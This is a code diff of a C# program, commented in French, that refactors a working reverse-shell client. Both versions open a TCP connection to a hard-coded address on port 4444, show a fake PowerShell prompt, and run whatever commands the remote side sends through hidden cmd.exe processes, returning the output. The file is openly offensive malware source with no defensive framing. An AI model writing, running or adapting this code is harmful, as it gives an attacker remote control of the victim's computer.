@@ -1,38 +1,36 @@
 using System;
 using System.IO;
 using System.Net.Sockets;
+using System.Text;
 
-class Program
+namespace RemoteShellClient
 {
-    static void Main(string[] args)
+    class Program
     {
-        try
+        static void Main(string[] args)
         {
-            // Adresse et port du serveur distant
-            string server = "172.28.137.218";  // Remplacez par l'adresse de votre serveur
-            int port = 4444;  // Remplacez par le port que vous utilisez
-
-            // Connexion au serveur distant via TCP
-            TcpClient client = new TcpClient(server, port);
+            // Se connecter à l'adresse IP et au port
+            string serverIp = "172.28.137.218";
+            int port = 4444;
+            TcpClient client = new TcpClient(serverIp, port);
             NetworkStream stream = client.GetStream();
             StreamWriter writer = new StreamWriter(stream);
             StreamReader reader = new StreamReader(stream);
             writer.AutoFlush = true;
 
-            // Boucle infinie pour envoyer/recevoir des commandes
             while (true)
             {
+                // Envoyer un prompt pour indiquer qu'on attend une commande
                 writer.Write("PS > ");
-                string command = reader.ReadLine();
-
-                if (command == "exit") 
+                string cmd = reader.ReadLine();
+                if (cmd == "exit")
                     break;
 
                 try
                 {
-                    // Exécuter la commande reçue via Invoke-Expression en PowerShell
-                    var result = ExecuteCommand(command);
-                    writer.WriteLine(result);
+                    // Exécuter la commande et envoyer la sortie
+                    var output = ExecuteCommand(cmd);
+                    writer.WriteLine(output);
                 }
                 catch (Exception ex)
                 {
@@ -40,33 +38,31 @@ class Program
                 }
             }
 
-            // Fermer la connexion lorsque la boucle est terminée
+            // Fermer la connexion
             client.Close();
         }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"Erreur : {ex.Message}");
-        }
-    }
 
-    static string ExecuteCommand(string command)
-    {
-        try
+        // Méthode pour exécuter une commande shell
+        private static string ExecuteCommand(string command)
         {
-            // Exécuter la commande et récupérer la sortie
-            System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
-            procStartInfo.RedirectStandardOutput = true;
-            procStartInfo.UseShellExecute = false;
-            procStartInfo.CreateNoWindow = true;
+            try
+            {
+                var process = new System.Diagnostics.Process();
+                process.StartInfo.FileName = "cmd.exe";
+                process.StartInfo.Arguments = $"/C {command}";
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.CreateNoWindow = true;
+                process.Start();
 
-            System.Diagnostics.Process process = System.Diagnostics.Process.Start(procStartInfo);
-            StreamReader reader = process.StandardOutput;
-
-            return reader.ReadToEnd();
-        }
-        catch (Exception ex)
-        {
-            return ex.Message;
+                string output = process.StandardOutput.ReadToEnd();
+                process.WaitForExit();
+                return output;
+            }
+            catch (Exception ex)
+            {
+                return ex.Message;
+            }
         }
     }
 }
